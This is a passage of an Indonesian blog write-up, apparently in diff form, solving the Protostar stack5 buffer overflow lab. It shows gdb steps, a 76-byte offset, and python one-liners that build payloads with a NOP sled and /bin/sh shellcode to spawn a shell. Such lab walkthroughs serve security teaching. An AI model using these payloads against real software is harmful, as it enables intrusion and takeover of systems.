+    style="padding-bottom: 31.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABDUlEQVQY02WRW0/CQBCFF9Q+KKjcvINEE0NLqCb0RrGl9IJWMcb//2OOc1awXh5OZjK7+83MWXVXvuM8XqHpxjj0FlrHfoL2bIlW8F+sH8n59u5WrLW8GGqYv8qlFL15jpPHQucHTgTjPsSePcOuHYiquDMJUJ/4f+pfuWH7UIPsBVfLEuP1B/oSO2Eq4FyrIWACKOMh1A/3p5FuWBt7UKYDZbmVzCnUZfKMi+QJt6s33BRrdAXYCTN05xlOo0KL+ZnYQvGccA0khHGjuiUNejIJgdecVOD079sz8YtTNt2F9o5ecV1luhXMqvIagfRwkJYYCrAvsS2ghnwQV6ef9FGvNpJ1Rs7vqX5CN8BPE3+zF0fzOvIAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="output runtutan perintah diatas"
+        title="output runtutan perintah diatas"
+        src="/static/e9ef894c38b7b47fe1a5990fa7083515/a016c/protostar-stack5-3.png"
+        srcset="/static/e9ef894c38b7b47fe1a5990fa7083515/772e8/protostar-stack5-3.png 200w,
+/static/e9ef894c38b7b47fe1a5990fa7083515/e17e5/protostar-stack5-3.png 400w,
+/static/e9ef894c38b7b47fe1a5990fa7083515/a016c/protostar-stack5-3.png 762w"
+        sizes="(max-width: 762px) 100vw, 762px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Salin isi dari eip lalu cari ukuran buffer+padding pada <a href="https://zerosum0x0.blogspot.com/2016/11/overflow-exploit-pattern-generator.html">halaman berikut</a>. Kita mendapatkan ukuran offset (buffer+padding) sebesar 76.</p>
+<p><span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 233px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/b6017d95b79cbaa36f18eab9f75104d8/a1d58/protostar-stack5-4.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 35%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAA7DAAAOwwHHb6hkAAABNklEQVQoz5WRS0/CUBSE+f97N25cKAtXxhBdEHm0QB9YSTAhpS0gkEqRAqVIKfLoZ4VQDYmJTjLJzCR3zsm5qelkzPBtiO/7jMcTXNdlESxwHIfRyGUZBLzP5/T7PV4HDp7nEQRLDog4IooOOjUc2GiagiCWaTR0nut1VFVBUVTUmJqm0W63eKzKqFqNXC6H1emx2IK/ivDCHav1JilN2baNYVp0uy8YhoGu67RaLSzLoqk348zEMs046+x9v9shW+twdVcifZPl4lZAstzvQtM04qkFak8akiRTLBYplyuIgogQa0EsocgSlbJMPl+gqkhkFJPLe4nzdIaz6wcq1mRfuPsqPL3BXxB+rJkGa/xwi7fc7H2y4dyfMXLHSXDgTx0l99/7X4YknxKGS2Yz/6Tw/zy+/wTBGws/KswfNwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="ukuran offset"
+        title="ukuran offset"
+        src="/static/b6017d95b79cbaa36f18eab9f75104d8/a1d58/protostar-stack5-4.png"
+        srcset="/static/b6017d95b79cbaa36f18eab9f75104d8/772e8/protostar-stack5-4.png 200w,
+/static/b6017d95b79cbaa36f18eab9f75104d8/a1d58/protostar-stack5-4.png 233w"
+        sizes="(max-width: 233px) 100vw, 233px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Pada challenge sebelumnya terdapat fungsi win yang kita jadikan tujuan. Namun disini tidak ada fungsi seperti itu, yang perlu kita lakukan ialah menjalankan shellcode. Jika kalian telah membaca <a href="https://yohan.es/security/buffer-overflow/shellcode/">artikel dari pak yohanes</a>. Tentunya kalian sudah mendapat gambaran langkah selanjutnya.</p>
+<p>Kita akan coba memasukkan shellcode dan mengeksekusinya. Tapi sebelumnya kita akan mempelajari terlebih dahulu dua instruksi, <code class="language-text">nop</code> dan <code class="language-text">int3</code>. Berdasarkan wikipedia, <strong>nop</strong> atau <strong>no operation</strong>, merupakan instruksi dalam bahasa assembly, pernyataan bahasa pemrograman, atau perintah protokol komputer yang tidak melakukan apa-apa. Opcode dari nop adalah <strong>90</strong>. Sedangkan <strong>int3</strong> berdasarkan wikipedia, merupakan satu-byte instruksi yang digunakan oleh debugger untuk sementara waktu mengganti instruksi dalam program yang sedang berjalan untuk menetapkan breakpoint. Opcode dari int3 ialah <strong>CC</strong>. Lebih lanjut mengenai nop dan int3 dapat kalian baca di wikipedia atau <a href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-instruction-set-reference-manual-325383.pdf">manual dari intel</a>.</p>
+<p>Lalu akan kita gunakan untuk apa kedua instruksi diatas? Sebelumnya kembali dahulu ke gdb. Kita perlu membersihkan breakpoint yang sebelumnya lalu memasang breakpoint baru pada alamat yang lain.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">del b
+disas main
+b* 0x080483d9</code></pre></div>
+<p>Perintah <code class="language-text">del b</code> digunakan untuk menghapus breakpoint (delete breakpoint). Kali ini breakpoint akan kita pasang pada saat <code class="language-text">leave</code>, gunakan perintah kedua untuk melihat alamatnya dan <code class="language-text">b*</code> untuk memasang breakpoint.</p>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 763px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/c55969490ee30bfd5c93cb9a22d90147/5e3a3/protostar-stack5-5.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 38.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABCUlEQVQoz5WS207CUBBFiyJGMaKoieEiBiNGLKICLaVW2mIo5WLj5f9/ZTt7GhN9kfIwSU9Ozpq1Z2pU/Qhn7gRHwwDFnofdRxeFhxG2OjaM9gDGnZXW7+//qjKO0JyucBHGCj20xig7AUq2j/3ecwr6gWWCLj9QC2a4mi5R7Hs4FdtjATcmc2ngY6frILeJobn6VGBrlmDvyRW7UMw8tOJEm/D8B7gO3E2+0HhdKKAkcU9GoUZuizmBl3JXl4bbnWE2Sxo25eF19IayRGXcA4lOAIuRaZ55lvUgxo3Y3S7eNToBrPy9o9vWGZpWunnTXm95/hLpI86NkblZGvFMUy6qIPf8pbLE/gYv1enyq0QpAgAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="hapus lalu pasang ulang breakpoint"
+        title="hapus lalu pasang ulang breakpoint"
+        src="/static/c55969490ee30bfd5c93cb9a22d90147/5e3a3/protostar-stack5-5.png"
+        srcset="/static/c55969490ee30bfd5c93cb9a22d90147/772e8/protostar-stack5-5.png 200w,
+/static/c55969490ee30bfd5c93cb9a22d90147/e17e5/protostar-stack5-5.png 400w,
+/static/c55969490ee30bfd5c93cb9a22d90147/5e3a3/protostar-stack5-5.png 763w"
+        sizes="(max-width: 763px) 100vw, 763px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Disini saya membuat sesi ssh baru ke mesin protostar untuk membuat payload. Alamat tujuan untuk eip sementara akan saya isi dengan <code class="language-text">BBBB</code>. Payload akan saya taruh di directory <code class="language-text">/tmp</code>.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">python -c <span class="token string">"print( 'A' * 76 + 'BBBB')"</span> <span class="token operator">></span> /tmp/payload
+<span class="token function">cat</span> /tmp/payload</code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 762px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/eff495f70997503ed164094e45c890f2/a016c/protostar-stack5-6.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 77.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAQCAYAAAAWGF8bAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACpklEQVQ4y61T205TURDdhUpbQChQqUipgEivAr1QeqGlpxdbykXFGI1f4JsPmmqUBw1JBUSsFyQqRv019V0SfV/OzDmnEtQ3m6zO7N3uNWvW7K2+fPuKH4ff8fPwEP/jox7svsKdxg5ub2yivv0cj16/xb2nTdS3drHe3MPmwWc8ef8JG/sf0Hj3UbD+4g3uP3uJx3sHqO82cWungYfNfdzd2oZSY2HYI2l0RjNoCyegfBGoQAyW0CxUMA41OaPDH0XHdBJqYgrK44fyBvU4QtEbomjsOSLzcKWLcGWKOJUpoSuegyM6j965PPpTBXTFsrDT+sxCBd5iDd2zObRdSKJ9ipFCO+WyNqCs9GUJz8E2k0ZPYkGIOOfoTGpC0EmkvGc1CFQo8W+oALVFODGdkkOszh7JwEbgPV53EoTIH4P5f8mDszqJGRlD2bK01p/SJJ4kRaxMFBL6KOe9gXRB1k7DitN0ToocJWP0G4cHhJRAa26diZiEC3FuFtUL6NZYp/5C2Ec/uKlaizDFREUhc9DkuX1um+2wmTlF5Y/rMFs2iZlICImAq/PE3Uds6CW1rMhpDOmoNR3ksQodUziUK2OsvAyPVsVZuhYch/MVePJVjBQWMV5ewrmLK1SogEEq5DIKcwFW/8dQTF+cybxUZW/Ew5TWygfnS3R19Elz6zx1Cx8OxH8TmaSjpSVRNsyKtEVCVXJuq88YEOe6p7qXeqvHlLUIhawi6rriWSHgg7zm3LybPeQjvxp+BHI3KW+j3LyPFpN4nPwLLq+BIytlxWOE89VVUdpNRfRnqIkN7B0/UX6qPDAuKoonozp5dO06EtduInb1Bny1KxiQP5fk6rhzFfgWL2OchuIt0nAqq/AWalR4iQovY7S8gonKJXhoj3/3aDX8AiF0JP+QXO43AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="buat payload"
+        title="buat payload"
+        src="/static/eff495f70997503ed164094e45c890f2/a016c/protostar-stack5-6.png"
+        srcset="/static/eff495f70997503ed164094e45c890f2/772e8/protostar-stack5-6.png 200w,
+/static/eff495f70997503ed164094e45c890f2/e17e5/protostar-stack5-6.png 400w,
+/static/eff495f70997503ed164094e45c890f2/a016c/protostar-stack5-6.png 762w"
+        sizes="(max-width: 762px) 100vw, 762px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Sekarang mari kita coba gunakan payload tersebut di gdb. Sebagai catatan tanda <strong>></strong> digunakan untuk mengalihkan stdout (standard output) menjadi stdin (standard input). Sedangkan tanda <strong>&#x3C;</strong> sebaliknya. Selengkapnya dapat dibaca <a href="https://www.gnu.org/software/bash/manual/html_node/Redirections.html">disini</a></p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">r <span class="token operator">&lt;</span> /tmp/payload
+info frame
+x/s 0xbffff7bc
+x/40x 0xbffff7bc</code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 759px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/cc2795cf5a2dabb501747aa4b3588391/ef3e1/protostar-stack5-7.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 63.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAYAAACpUE5eAAAACXBIWXMAAA7DAAAOwwHHb6hkAAACCUlEQVQ4y21TbVcSYRRcFAWztFCTyJeUCilACFZgBXkRWF5EMLFj5/T//8Y0c4nkAB/u2Wf32Tt37sy9znGzhz2viVjNh84fbjp4XajiVZ7xo4JtPjcuy3yvYLdYRzh3DeeiAOebC+f71ctzFu9KDeyVm9i9qlmC3t9XWti/vjXwKOOA5wj/0Tfdb7NgMFNaBlPsuDVjI3bnnTsDUIEtsnvj3ljyDouJ9VqqiACTAjNmqwA/1rtQfGoNjNFbshQbyaB2A3M/r6dL2Lz0TArJsBIwVvdxQnYX/TESjFhNLbasbUXknwRHjS6i1baBiflm1lsNqBZPb/uId4b47A+pUR0HBDhkshibxt5UQ0lhSYumzAOfNPs4Y7tqWcCHBAvRSbkqbacAeThJgiTyL8lJd/pt0e2vvRHO2nfmpNiK5UZmqk+IbQlUZshVGRXUHRN1F8p5y6MTJ4DaDfNSbSUHDziiSWs0QOfs+MlmL8K2U8OfpqcMifv31H2EYHphfASmUEXplRlNcNwQYJFsmcQOZICKCVCSrJOtOkvfP7KbFYByOCxAJhUmzzhvDxBgm/r+nyHvcg+/bAo0Pone2AosDfiXripNsMUkbYKSZgyzPBeffnP2yua69/yHcvimY2r4CJfFbR6Tc4C2HdWOUdcga960hmIYtdVrGyNtjBZAdyqm4vvUVYbNM/wLU4iK7wOGYUkAAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="kondisis stack setelah payload dimasukkan"
+        title="kondisis stack setelah payload dimasukkan"
+        src="/static/cc2795cf5a2dabb501747aa4b3588391/ef3e1/protostar-stack5-7.png"
+        srcset="/static/cc2795cf5a2dabb501747aa4b3588391/772e8/protostar-stack5-7.png 200w,
+/static/cc2795cf5a2dabb501747aa4b3588391/e17e5/protostar-stack5-7.png 400w,
+/static/cc2795cf5a2dabb501747aa4b3588391/ef3e1/protostar-stack5-7.png 759w"
+        sizes="(max-width: 759px) 100vw, 759px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Dapat kalian lihat diatas jika <strong>BBBB</strong> sudah menimpa eip. Dengan perintah terakhir kita dapat men examine eip dalam hex sebanyak 40. Kita akan menggunakan alamat setelah eip tersebut untuk meletakkan payload dan tujuan eip. Mari kita modifikasi lagi payload kita.
+Kita akan menambahkan opcode dari int3 setelah eip lalu mengarahkan eip ke 0xbffff7c0. Alamat 0xbffff7c0 didapatkan dari eip + 4byte (panjang eip) sehingga akan mengarahkan eip ke int3. Sebagai catatan perhitungan dilakukan dengan hex yaitu 1-f.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">python -c <span class="token string">"print( 'A' * 76 + '<span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xbf">\xbf</span>' + '<span class="token entity" title="\xcc">\xcc</span>')"</span> <span class="token operator">></span> /tmp/payload
+<span class="token function">cat</span> /tmp/payload</code></pre></div>
+<p>Kita hapus seluruh breakpoint sebelumnya lalu jalankan ulang stack5 di gdb dengan payload baru.</p>
+<div class="gatsby-highlight" data-language="text"><pre class="language-text"><code class="language-text">del b
+r &lt; /tmp/payload</code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 682px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/771375e0463e68ebacfb69a0cacfc582/160a3/protostar-stack5-8.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 27.500000000000004%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAA7DAAAOwwHHb6hkAAABC0lEQVQY032Ra0vDMBiFi1Ns19lNXIsonUxE56W63ru1W6+UWiaToaj//4cc32QWsagfDick4cnzEuEsr3ESlxiGOdSwgOIuIZohRCvC3sMMwrXzMzcuhFvvu9s5XpYceFU/47Ja46JcETiH4sUY+Alke4E+ddeO0Ke9jhH8Dx0ECbSo4IbDeQ49e4SeVjgMUkpCiSFZIfanM947d97WtAG0obLDDGIczTNINCqzYY+wyG4G0U7R83IIRgTJyei84Hf/NByRERv5NKmgkqnKTTNoiwrp0wSvbzrWL2OsNmO8f4xQb86xe+8TjAF+AWoEkOgDmnQM/+vQR3dqQbFMHJjbsHWPmps1wJblJ/9CsSWkO1evAAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="jalankan stack5 di gdb dengan payload baru"
+        title="jalankan stack5 di gdb dengan payload baru"
+        src="/static/771375e0463e68ebacfb69a0cacfc582/160a3/protostar-stack5-8.png"
+        srcset="/static/771375e0463e68ebacfb69a0cacfc582/772e8/protostar-stack5-8.png 200w,
+/static/771375e0463e68ebacfb69a0cacfc582/e17e5/protostar-stack5-8.png 400w,
+/static/771375e0463e68ebacfb69a0cacfc582/160a3/protostar-stack5-8.png 682w"
+        sizes="(max-width: 682px) 100vw, 682px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Instruksi kita dijalankan! Program mengeksekusi int3 sehingga muncul notifikasi <em>Program received signal SIGTRAP, <strong>Trace/breakpoint trap</strong>.</em> Selanjutnya ialah mengganti instruksi int3 dengan shellcode yang dapat mengeksekusi shell. Saya menggunakan shellcode <a href="http://shell-storm.org/shellcode/files/shellcode-851.php">berikut</a> yang saya dapatkan dari <a href="http://shell-storm.org/shellcode/">shell-storm.org</a>.</p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">python -c <span class="token string">"print( 'A' * 76 + '<span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xbf">\xbf</span>' + '<span class="token entity" title="\x31">\x31</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xcd">\xcd</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x68">\x68</span>')"</span> <span class="token operator">></span> /tmp/payload
+
+r <span class="token operator">&lt;</span> /tmp/payload <span class="token comment">#pada gdb</span></code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 764px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/b8747caf8d5e4eb8133be123b44ee48c/f3c12/protostar-stack5-9.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 20.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAqElEQVQY032P2wqCQBRFJQoJjSSswIoKesnu5SVvOZpmJT4E/f+v7GYmSgjyYbHOy15wBD1/oOcnGEU3TJIcs6xAx4nQMk8c2QggUZgF3XyzsEr/Mo7vUI6ERxWbQAsvGJAMqhtzWFTcupAOAXdtZf+PMaZpgX6QYkiu0GiIhVXvjC61uPPQ3PtobBweZPH62qkOLosn2lbIBzIdsPv7EmNulP7cFS+/AAg5dTEd/Mp4AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="menjalankan pada gdb dengan payload baru"
+        title="menjalankan pada gdb dengan payload baru"
+        src="/static/b8747caf8d5e4eb8133be123b44ee48c/f3c12/protostar-stack5-9.png"
+        srcset="/static/b8747caf8d5e4eb8133be123b44ee48c/772e8/protostar-stack5-9.png 200w,
+/static/b8747caf8d5e4eb8133be123b44ee48c/e17e5/protostar-stack5-9.png 400w,
+/static/b8747caf8d5e4eb8133be123b44ee48c/f3c12/protostar-stack5-9.png 764w"
+        sizes="(max-width: 764px) 100vw, 764px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Terjadi eksekusi shell <code class="language-text">dash</code> yang ditandai dengan, <strong>Executing new program: /bin/dash</strong>. Mari kita jalankan langsung tanpa gdb. </p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"> python -c <span class="token string">"print( 'A' * 76 + '<span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xbf">\xbf</span>' + '<span class="token entity" title="\x31">\x31</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xcd">\xcd</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x68">\x68</span>')"</span> <span class="token operator">|</span> ./stack5</code></pre></div>
+<p> output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 760px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/3f099b39c049939abd3d6261e3f01ebc/3c051/protostar-stack5-10.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 9%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAg0lEQVQI12NQ9/T/L+fk9V/J1ee/qocfnFZ28wWzpe3d/4vbuv5XcPH+L2rt/F/awf2/mI0rUI/nf3lnLzAt7eDxX8TaBayGQcXd978sUFARqFnEyuk/i57FfwELx/+cRjb/GbTN/jPpmoMxo47Zf2YgzaxrAcaMOuZQbAamQWJMQBoAWZw+Ttw/FD8AAAAASUVORK5CYII='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="menjalankan langsung stack5 dengan payload baru"
+        title="menjalankan langsung stack5 dengan payload baru"
+        src="/static/3f099b39c049939abd3d6261e3f01ebc/3c051/protostar-stack5-10.png"
+        srcset="/static/3f099b39c049939abd3d6261e3f01ebc/772e8/protostar-stack5-10.png 200w,
+/static/3f099b39c049939abd3d6261e3f01ebc/e17e5/protostar-stack5-10.png 400w,
+/static/3f099b39c049939abd3d6261e3f01ebc/3c051/protostar-stack5-10.png 760w"
+        sizes="(max-width: 760px) 100vw, 760px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
+<p>Terjadi segmentation fault! Terdapat perbedaan saat menjalankan stack5 dengan gdb dan secara langsung. Salah satu perbedaan tersebut ialah <strong>posisi stack</strong>, tempat kita memasang shellcode. Kalian dapat membaca lebih lanjut mengenai perbedaan ini dengan mencarinya di google. Lanjut saja ke cara penyelesaian masalah ini, kita akan memakai instruksi nop. Kita akan mengisi stack dengan instruksi nop yang banyak, diikuti dengan shellcode lalu mengarahkan eip ke nop. Dengan begitu kita tidak perlu <strong>tepat</strong> mengarahkan eip ke ke awal shellcode, secara otomatis eip akan mengarahkan ke shellcode jika ia mengarah ke padding nop yang kita berikan. </p>
+<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">python -c <span class="token string">"print( 'A' * 76 + '<span class="token entity" title="\xc0">\xc0</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xbf">\xbf</span>' + '<span class="token entity" title="\x90">\x90</span>'* 60 + '<span class="token entity" title="\x31">\x31</span><span class="token entity" title="\xc9">\xc9</span><span class="token entity" title="\xf7">\xf7</span><span class="token entity" title="\xe9">\xe9</span><span class="token entity" title="\x51">\x51</span><span class="token entity" title="\x04">\x04</span><span class="token entity" title="\x0b">\x0b</span><span class="token entity" title="\xeb">\xeb</span><span class="token entity" title="\x08">\x08</span><span class="token entity" title="\x5e">\x5e</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\xe6">\xe6</span><span class="token entity" title="\x99">\x99</span><span class="token entity" title="\x87">\x87</span><span class="token entity" title="\xdc">\xdc</span><span class="token entity" title="\xcd">\xcd</span><span class="token entity" title="\x80">\x80</span><span class="token entity" title="\xe8">\xe8</span><span class="token entity" title="\xf3">\xf3</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\xff">\xff</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x62">\x62</span><span class="token entity" title="\x69">\x69</span><span class="token entity" title="\x6e">\x6e</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x2f">\x2f</span><span class="token entity" title="\x73">\x73</span><span class="token entity" title="\x68">\x68</span>')"</span>  <span class="token operator">|</span> ./stack5</code></pre></div>
+<p>output:
+<span
+      class="gatsby-resp-image-wrapper"
+      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 763px; "
+    >
+      <a
+    class="gatsby-resp-image-link"
+    href="/static/d783ef41c1fb57f2dfdec1922719c364/5e3a3/protostar-stack5-11.png"
+    style="display: block"
+    target="_blank"
+    rel="noopener"
+  >
+    <span
+    class="gatsby-resp-image-background-image"
+    style="padding-bottom: 10%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAA7DAAAOwwHHb6hkAAAAfElEQVQI1yVMOQ6DQBDjqGiiNEmQOAJFOmgiwRYBRGC5FpT//8bxDoXHHtuyE7Yz8ulAOmxIiEwb/jtyvVOfiPoVMRG2E+6Nxu0zivccDVLCeg9m8XeFE/G8lh/DTUYzFmzRjl6qDsG7wVX18AoFr1Twy5PdohZP2HqiFf5ckD7pBFAvJwAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
+  ></span>
+  <img
+        class="gatsby-resp-image-image"
+        alt="menjalankan stack5 dengan payload berisi nop"
+        title="menjalankan stack5 dengan payload berisi nop"
+        src="/static/d783ef41c1fb57f2dfdec1922719c364/5e3a3/protostar-stack5-11.png"
+        srcset="/static/d783ef41c1fb57f2dfdec1922719c364/772e8/protostar-stack5-11.png 200w,
+/static/d783ef41c1fb57f2dfdec1922719c364/e17e5/protostar-stack5-11.png 400w,
+/static/d783ef41c1fb57f2dfdec1922719c364/5e3a3/protostar-stack5-11.png 763w"
+        sizes="(max-width: 763px) 100vw, 763px"
+        style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
+        loading="lazy"
+      />
+  </a>
+    </span></p>
